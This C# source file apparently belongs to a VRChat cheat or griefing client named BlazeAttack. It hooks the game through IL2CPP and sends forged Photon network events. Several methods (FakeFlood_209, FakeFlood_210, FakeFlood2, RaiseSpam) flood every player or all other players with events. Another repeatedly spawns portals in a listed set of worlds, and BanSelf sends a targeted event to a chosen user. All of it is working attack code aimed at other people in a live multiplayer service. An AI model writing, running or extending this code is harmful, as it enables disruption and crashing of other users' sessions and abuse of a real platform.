using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using BlazeIL;
using BlazeIL.il2cpp;
using BlazeTools;
using ExitGames.Client.Photon;
using UnityEngine;
using VRCSDK2;


namespace BlazeAttack
{
    public static class PhotonUtils
    {
        public static string[] raise200_Worlds = new string[] {
                "wrld_b9157897-14b5-47f8-85e0-a9cd85d085ee",
                "wrld_01796738-226e-495b-9aa5-ad97535a1388",
                "wrld_c215101b-8f13-408c-8bc6-1687cf87762f",
                "wrld_97076355-36cb-4f5d-9074-e1ac97c1a489",
                "wrld_98400948-004d-44b8-9dea-293a3badf70f",
                "wrld_c6b6c1fa-ed05-46eb-a148-38655c64b8e4",
                "wrld_740c3481-9d4b-446e-8bb7-c94b00c53801",
                "wrld_21df17ca-8340-43a9-95e9-2f668a4263e3",
                "wrld_4cf554b4-430c-4f8f-b53e-1f294eed230b",
                "wrld_be3f0b84-ec6f-4a67-beb6-93d5049316c7",
                "wrld_4432ea9b-729c-46e3-8eaf-846aa0a37fdd",
                "wrld_c5796060-01b4-49af-a555-1ee3a4af8503",
                "wrld_d0b62423-fd59-48f7-9e4b-e6fece81b7ed",
                "wrld_d0b62423-fd59-48f7-9e4b-e6fece81b7ed",
                "wrld_fae3fa95-bc18-46f0-af57-f0c97c0ca90a",
                "wrld_fae3fa95-bc18-46f0-af57-f0c97c0ca90a",
                "wrld_78373831-0109-4808-9b63-27382f4c6975",
                "wrld_ccbf8103-c23e-472f-8efb-38a9a9164357",
                "wrld_58e44637-9916-481e-93e5-2929bacd3bb9",
                "wrld_736bad27-4663-4346-a345-26e1e859d94e",
                "wrld_736bad27-4663-4346-a345-26e1e859d94e",
                "wrld_7e10376a-29b6-43af-ac5d-6eb72732e90c",
                "wrld_6caf5200-70e1-46c2-b043-e3c4abe69e0f",
            };

        public static long raise200_num = -1;
        public static int raise209_num = 0;
        public static bool raise209_status = false;

        public static bool isInstalled = false;
        public static IntPtr raise200_broadcast;
        public static IntPtr raise200_prefabName;
        public static IntPtr raise200_position;
        public static IntPtr raise200_rotation;
        public static void Raise200()
        {
            if (!isInstalled)
            {
                raise200_broadcast = VRC_EventHandler.VrcBroadcastType.Always.MonoCast();
                IL2Import.il2cpp_gchandle_new(raise200_broadcast, true);
                raise200_prefabName = new IL2String("Portals/PortalInternalDynamic").ptr;
                IL2Import.il2cpp_gchandle_new(raise200_prefabName, true);
                raise200_position = Vector3.zero.MonoCast();
                IL2Import.il2cpp_gchandle_new(raise200_position, true);
                raise200_rotation = new Quaternion(0, 0, 0, 0).MonoCast();
                IL2Import.il2cpp_gchandle_new(raise200_rotation, true);
            }


            for (int i=0;i<5;i++)
                VRC.Network.Instantiate(raise200_broadcast, raise200_prefabName, raise200_position, raise200_rotation);
        }

        public static readonly object nObj = new object();
        public static void FakeFlood_210(int viewId, int fromId)
        {
            IntPtr intPtrs = new IntPtr[2]
            {
                viewId.MonoCast(),
                fromId.MonoCast()
            }.ArrayToIntPtr(IL2SystemClass.Int32);
            NetworkPeer.Instance.OpRaiseEvent(210, intPtrs, new RaiseEventOptions()
            {
                Receivers = ReceiverGroup.All
            }, SendOptions.SendReliable);
        }

        public static void FakeFlood_209(int viewId, int fromId)
        {
            IntPtr intPtrs = new IntPtr[2]
            {
                viewId.MonoCast(),
                fromId.MonoCast()
            }.ArrayToIntPtr(IL2SystemClass.Int32);
            NetworkPeer.Instance.OpRaiseEvent(209, intPtrs, new RaiseEventOptions()
            {
                Receivers = ReceiverGroup.All
            }, SendOptions.SendReliable);
        }

        public static void FakeFlood2(int viewId, int fromId)
        {
            IntPtr intPtrs = new IntPtr[2]
            {
                IL2Import.CreateNewObject(viewId, IL2SystemClass.Int32),
                IL2Import.CreateNewObject(fromId, IL2SystemClass.Int32)
            }.ArrayToIntPtr(IL2SystemClass.Int32);
            networkingPeer.OpRaiseEvent(9, intPtrs, new RaiseEventOptions()
            {
                Receivers = ReceiverGroup.All
            }, SendOptions.SendReliable);
        }

        public static void RaiseSpam()
        {
            networkingPeer.OpRaiseEvent(7, IntPtr.Zero, new RaiseEventOptions()
            {
                CachingOption = EventCaching.DoNotCache,
                Receivers = ReceiverGroup.Others
            }, new SendOptions() { DeliveryMode = DeliveryMode.UnreliableUnsequenced, Encrypt = false });

        }

        public static void BanSelf(int userId)
        {
            networkingPeer.OpRaiseEvent(203, IntPtr.Zero, new RaiseEventOptions()
            {
                TargetActors = new int[1]
                {
                    userId
                }
            }, SendOptions.SendReliable);
        }

        private static NetworkingPeer networkingPeer = PhotonNetwork.networkingPeer;
    }
}

